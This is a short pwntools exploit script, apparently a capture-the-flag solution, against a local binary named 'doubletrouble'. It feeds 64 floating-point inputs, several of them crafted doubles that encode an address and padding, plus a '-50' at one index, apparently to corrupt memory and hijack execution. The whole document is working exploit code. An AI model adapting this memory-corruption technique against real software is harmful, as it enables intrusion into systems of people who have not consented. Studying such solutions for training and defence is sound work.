#!/usr/bin/env python3

import pwn

io = pwn.process("./doubletrouble", checksec=False)
# pwn.context.terminal = "kitty"
# pwn.gdb.attach(io, gdbscript="b*0x08049733")

addr_injection = b"4.87223406200468e-270"
padding = b"-1.5846380065386629e+306"

io.sendline(b"64")
for i in range(64):
    if i == 0:
        io.sendline(addr_injection)
        continue
    if i == 5:
        io.sendline(b"-50")
        continue
    io.sendline(padding)
    
res = io.recvall(timeout=2)
print(res.decode())
